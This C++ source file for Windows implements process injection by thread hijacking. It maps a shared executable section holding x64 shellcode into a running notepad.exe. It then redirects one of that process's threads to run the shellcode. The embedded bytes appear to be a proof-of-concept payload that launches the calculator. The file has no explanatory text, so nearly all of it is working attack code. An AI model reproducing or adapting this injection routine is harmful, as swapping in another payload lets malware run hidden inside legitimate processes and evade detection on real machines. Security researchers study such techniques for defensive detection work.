#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
typedef NTSTATUS(NTAPI* p_ZwMapViewOfSection)(
	HANDLE SectionHandle,
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	SIZE_T CommitSize,
	PLARGE_INTEGER SectionOffset,
	PSIZE_T ViewSize,
	DWORD InheritDisposition,
	ULONG AllocationType,
	ULONG Win32Protect
	);
void EnableDebugPriv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);

	CloseHandle(hToken);
}
int main() {
	unsigned char code[] =
	{ 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B,
0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B,
0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE,
0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57,
0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48,
0x01, 0xF7, 0x99, 0xFF, 0xD7 };
	size_t bufferSize = sizeof(code);
	HANDLE hMapFile = CreateFileMappingA(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		bufferSize,
		NULL
	);

	if (hMapFile == NULL) {
		return 1;
	}
	LPVOID pBuffer = MapViewOfFile(
		hMapFile,
		FILE_MAP_WRITE,
		0,
		0,
		bufferSize
	);

	if (pBuffer == NULL) {
		CloseHandle(hMapFile);
		return 1;
	}

	DWORD old;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	PROCESSENTRY32W processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32W);
	CONTEXT context;
	context.ContextFlags = CONTEXT_CONTROL;
	HANDLE procSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	WCHAR target[] = L"notepad.exe";
	Thread32First(threadSnapshot, &threadEntry);
	Process32FirstW(procSnapshot, &processEntry);
	DWORD lerr = GetLastError();
	while (Process32NextW(procSnapshot, &processEntry))
	{
		if (_wcsicmp(processEntry.szExeFile, target) == 0)
		{
			while (Thread32Next(threadSnapshot, &threadEntry))
			{
				if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID)
				{
					HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION, 0, processEntry.th32ProcessID);
					HANDLE hMapFileDup = 0;
					HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
					p_ZwMapViewOfSection ZwMapViewOfSection = (p_ZwMapViewOfSection)GetProcAddress(hNtdll, "ZwMapViewOfSection");
					PVOID remoteBaseAddress = NULL;
					size_t viewSize = 0;
					NTSTATUS status = ZwMapViewOfSection(
						hMapFile,
						hProc,
						&remoteBaseAddress,
						0,
						0,
						NULL,
						&viewSize,
						2,
						0,
						PAGE_EXECUTE_READ
					);
					CloseHandle(hProc);
					CopyMemory(pBuffer, code, sizeof(code));
					HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
					SuspendThread(hThread);
					CONTEXT ctx;
					ctx.ContextFlags = CONTEXT_CONTROL;
					GetThreadContext(hThread, &ctx);
					ctx.Rip = (DWORD64)remoteBaseAddress;
					SetThreadContext(hThread, &ctx);
					ResumeThread(hThread);
					break;
				}
			}
			break;
		}
	}
	lerr = GetLastError();
	CloseHandle(threadSnapshot);
	CloseHandle(procSnapshot);
	UnmapViewOfFile(pBuffer);
	CloseHandle(hMapFile);

	return 0;
}
